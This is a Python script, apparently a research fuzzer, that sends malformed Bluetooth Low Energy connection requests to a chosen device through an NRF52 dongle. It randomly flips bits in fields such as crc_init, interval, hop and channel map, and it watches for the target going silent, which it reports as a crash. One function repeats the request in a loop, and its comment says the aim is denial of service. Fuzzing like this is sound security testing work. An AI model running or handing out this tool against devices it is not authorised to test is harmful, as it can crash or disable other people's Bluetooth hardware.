#!/usr/bin/python
# -*- coding:UTF-8 -*-
import os
import platform
import sys
from threading import Timer
from time import sleep
import random


# libs
sys.path.insert(0, os.getcwd() + '/libs')
import colorama
from colorama import Fore
from drivers.NRF52_dongle import NRF52Dongle
from scapy.layers.bluetooth4LE import *
from scapy.utils import wrpcap
from scapy.compat import raw
from libs.scapy.layers.bluetooth4LE import BTLE, BTLE_ADV, BTLE_CONNECT_REQ, BTLE_SCAN_REQ, BTLE_SCAN_RSP

none_count = 0
slave_connected = False
send_version_ind = False
end_connection = False
slave_addr_type = 0


def send(scapy_pkt, print_tx=True):
    driver.raw_send(raw(scapy_pkt))
    if print_tx:
        print(Fore.CYAN + "TX ---> " + scapy_pkt.summary()[7:])


# Autoreset colors
colorama.init(autoreset=True)

# Get serial port from command line
if len(sys.argv) >= 2:
    serial_port = sys.argv[1]
elif platform.system() == 'Linux':
    serial_port = '/dev/ttyACM0'
elif platform.system() == 'Windows':
    serial_port = 'COM1'
else:
    print(Fore.RED + 'Platform not identified')
    sys.exit(0)

print(Fore.YELLOW + 'Serial port: ' + serial_port)

# Get advertiser_address from command line (peripheral addr)
if len(sys.argv) >= 3:
    advertiser_address = sys.argv[2].lower()
else:
    advertiser_address = '38:81:d7:3d:45:a2'

print(Fore.YELLOW + 'Advertiser Address: ' + advertiser_address.upper())


def crash_timeout():
    print(Fore.RED + "No advertisement from " + advertiser_address.upper() +
          ' received\nThe device may have crashed!!!')
    exit(0)


def scan_timeout():
    global slave_addr_type, timeout_scan
    if not slave_connected:
        scan_req = BTLE() / BTLE_ADV(RxAdd=slave_addr_type) / BTLE_SCAN_REQ(
            ScanA=master_address,
            AdvA=advertiser_address)
        send(scan_req)

    timeout_scan = Timer(5, scan_timeout)
    timeout_scan.daemon = True
    timeout_scan.start()


#-----------------------------fuzz相关的函数------------------
def random_hex(length):
    result = hex(random.randint(0,16**length)).replace('0x','').upper()
    if(len(result)<length):
        result = '0'*(length-len(result))+result
    return result
#上述函数用于生成随机16进制数

# 随机生成一个MAC地址的函数
def creat_mac():
    MAC= ''
    # 生成16进制的数
    hex_num = "0123456789abcdefABCDEF"
    # 0123456789abcdefABCDEF
    n = random.sample(hex_num,2)
    # 从16进制字符串中随机选出2个数来(返回值为列表)['a', 'd']
    MAC=''.join(n).lower()
    for i in range(5):
        n = random.sample(hex_num,2)
        # 拼接列表中的内容,将大写字母转换为小写字母
        sn = ':' + ''.join(n).lower()
        MAC += sn

    return MAC

#1.对数据包进行反复发送，尝试使服务器拒绝服务
def fuzz1():
    conn_request = BTLE() / BTLE_ADV(RxAdd=slave_addr_type, TxAdd=0) / BTLE_CONNECT_REQ(
                InitA=master_address,
                AdvA=advertiser_address,
                AA=access_address,  # Access address (any)
                crc_init=0x179a9c,  # CRC init (any)
                win_size=2,  # 2.5 of windows size (anchor connection window size)
                win_offset=2,  # 1.25ms windows offset (anchor connection point)
                interval=16,  # 20ms connection interval
                latency=0,  # Slave latency (any)
                timeout=50,  # Supervision timeout, 500ms
                # ---------------------28 Bytes until here--------------------------
                # Truncated when sending over the air, but the initiator will try the following:
                chM=0x0000000001,
                hop=5,  # any, including 0
                SCA=0,  # Clock tolerance
            )
    while TRUE:
        #conn_request[BTLE_CONNECT_REQ].AA=random_hex（8）
        #conn_request[BTLE_CONNECT_REQ].AdvA=random_hex（8）
        #conn_request[BTLE_CONNECT_REQ].InitA=creat_mac()
        send(conn_request)
#2.将正常数据包进行截断或者构造超长数据包
def fuzz2():
    conn_request = BTLE() / BTLE_ADV(RxAdd=slave_addr_type, TxAdd=0) / BTLE_CONNECT_REQ(
                InitA=master_address,
                AdvA=advertiser_address,
                AA=access_address,  # Access address (any)
                crc_init=0x179a9c,  # CRC init (any)
                win_size=2,  # 2.5 of windows size (anchor connection window size)
                win_offset=2,  # 1.25ms windows offset (anchor connection point)
                interval=16,  # 20ms connection interval
                latency=0,  # Slave latency (any)
                timeout=50,  # Supervision timeout, 500ms
                # ---------------------28 Bytes until here--------------------------
                # Truncated when sending over the air, but the initiator will try the following:
                chM=0x0000000001,
                hop=5,  # any, including 0
                SCA=0,  # Clock tolerance
            )
    while True:
        #conn_request[BTLE_ADV].Length=random.randint(1,34)#将数据包进行截断
        #conn_request[BTLE_ADV].Length=random.randint(35,1000000000)#构造比正常数据包长的数据包
        send(conn_request)
#3.随机修改数据包中的内容
def case1(conn_request):
    a=random.randint(0,1)
    #c=bytearray(conn_request[BTLE_CONNECT_REQ].crc_init)
    while a == 1 :
        a1=random.randint(0,23)
        conn_request[BTLE_CONNECT_REQ].crc_init=conn_request[BTLE_CONNECT_REQ].crc_init^(1<<a1)
        a=random.randint(0,1)

def case2(conn_request):
    a=random.randint(0,1)
    #c=bytearray(conn_request[BTLE_CONNECT_REQ].win_size)
    while a == 1 :
        a2=random.randint(0,7)
        conn_request[BTLE_CONNECT_REQ].win_size=conn_request[BTLE_CONNECT_REQ].win_size^(1<<a2)
        a=random.randint(0,1)

def case3(conn_request):
    a=random.randint(0,1)
    #c=bytearray(conn_request[BTLE_CONNECT_REQ].win_offset)
    while a == 1 :
        a3=random.randint(0,15)
        conn_request[BTLE_CONNECT_REQ].win_offset=conn_request[BTLE_CONNECT_REQ].win_offset^(1<<a3)
        a=random.randint(0,1)

def case4(conn_request):
    a=random.randint(0,1)
    #c=bytearray(conn_request[BTLE_CONNECT_REQ].interval)
    while a == 1 :
        a4=random.randint(0,15)
        conn_request[BTLE_CONNECT_REQ].interval=conn_request[BTLE_CONNECT_REQ].interval^(1<<a4)
        a=random.randint(0,1)

def case5(conn_request):
    a=random.randint(0,1)
    #c=bytearray(conn_request[BTLE_CONNECT_REQ].latency)
    while a == 1 :
        a5=random.randint(0,15)
        conn_request[BTLE_CONNECT_REQ].latency=conn_request[BTLE_CONNECT_REQ].latency^(1<<a5)
        a=random.randint(0,1)

def case6(conn_request):
    a=random.randint(0,1)
    #c=bytearray(conn_request[BTLE_CONNECT_REQ].timeout)
    while a == 1 :
        a6=random.randint(0,15)
        conn_request[BTLE_CONNECT_REQ].timeout=conn_request[BTLE_CONNECT_REQ].timeout^(1<<a6)
        a=random.randint(0,1)

def case7(conn_request):
    a=random.randint(0,1)
    #c=bytearray(conn_request[BTLE_CONNECT_REQ].chM)
    while a == 1 :
        a7=random.randint(0,39)
        conn_request[BTLE_CONNECT_REQ].chM=conn_request[BTLE_CONNECT_REQ].chM^(1<<a7)
        a=random.randint(0,1)

def case8(conn_request):
    a=random.randint(0,1)
    #c=bytearray(conn_request[BTLE_CONNECT_REQ].hop)
    while a == 1 :
        a8=random.randint(0,4)
        conn_request[BTLE_CONNECT_REQ].hop=conn_request[BTLE_CONNECT_REQ].hop^(1<<a8)
        a=random.randint(0,1)

def case9(conn_request):
    a=random.randint(0,1)
    #c=bytearray(conn_request[BTLE_CONNECT_REQ].SCA)
    while a == 1 :
        a9=random.randint(0,2)
        conn_request[BTLE_CONNECT_REQ].SCA=conn_request[BTLE_CONNECT_REQ].SCA^(1<<a9)
        a=random.randint(0,1)

mutatetool = {1:case1, 2:case2, 3:case3, 4:case4, 5:case5, 6:case6, 7:case7, 8:case8, 9:case9}

def fuzz3():
    global conn_request
    b=random.randint(1,9)
    mutatetool[b](conn_request)
    send(conn_request)
    wrpcap('logs/conn_req_fuzz.pcap', conn_request, append=True)

# Default master address
master_address = '5d:36:ac:90:0b:22'
access_address = 0x9a328370
# Open serial port of NRF52 Dongle
driver = NRF52Dongle(serial_port, '115200')
# Send scan request
scan_req = BTLE() / BTLE_ADV(RxAdd=slave_addr_type) / BTLE_SCAN_REQ(
    ScanA=master_address,
    AdvA=advertiser_address)
send(scan_req)
conn_request = BTLE() / BTLE_ADV(RxAdd=slave_addr_type, TxAdd=0) / BTLE_CONNECT_REQ(
                InitA=master_address,
                AdvA=advertiser_address,
                AA=access_address,  # Access address (any)
                crc_init=0x179a9c,  # CRC init (any)
                win_size=2,  # 2.5 of windows size (anchor connection window size)
                win_offset=2,  # 1.25ms windows offset (anchor connection point)
                interval=16,  # 20ms connection interval
                latency=0,  # Slave latency (any)
                timeout=50,  # Supervision timeout, 500ms
                # ---------------------28 Bytes until here--------------------------
                # Truncated when sending over the air, but the initiator will try the following:
                chM=0x0000000001,
                hop=5,  # any, including 0
                SCA=0,  # Clock tolerance
            )
# Start the scan timeout to resend packets
timeout_scan = Timer(5, scan_timeout)
timeout_scan.daemon = True
timeout_scan.start()

timeout = Timer(5.0, crash_timeout)
timeout.daemon = True
timeout.start()
c = False
print(Fore.YELLOW + 'Waiting advertisements from ' + advertiser_address)
while True:
    pkt = None
    # Receive packet from the NRF52 Dongle
    data = driver.raw_receive()
    if data:
        # Decode Bluetooth Low Energy Data
        pkt = BTLE(data)
        # if packet is incorrectly decoded, you may not be using the dongle
        if pkt is None:
            none_count += 1
            if none_count >= 4:
                print(Fore.RED + 'NRF52 Dongle not detected')
                sys.exit(0)
            continue
        elif slave_connected and BTLE_EMPTY_PDU not in pkt:
            # Print slave data channel PDUs summary
            print(Fore.MAGENTA + "Slave RX <--- " + pkt.summary()[7:])
            wrpcap('logs/conn_req_fuzz.pcap', pkt, append=True)
        # --------------- Process Link Layer Packets here ------------------------------------
        # Check if packet from advertised is received
        if pkt:
            print(Fore.MAGENTA + "Slave RX <--- " + pkt.summary()[7:])
            wrpcap('logs/conn_req_fuzz.pcap', pkt, append=True)
        if pkt and (BTLE_SCAN_RSP in pkt or BTLE_ADV in pkt) and pkt.AdvA == advertiser_address.lower():
            timeout.cancel()
            slave_addr_type = pkt.TxAdd
            print(Fore.GREEN + advertiser_address.upper() + ': ' + pkt.summary()[7:] + ' Detected')
            wrpcap('logs/conn_req_fuzz.pcap', pkt, append=True)
            # Send connection request to advertiser
            fuzz3()
            print(Fore.YELLOW + 'Malformed connection request was sent')

            # Start the timeout to detect crashes
            timeout = Timer(5.0, crash_timeout)
            timeout.daemon = True
            timeout.start()

    sleep(0.01)
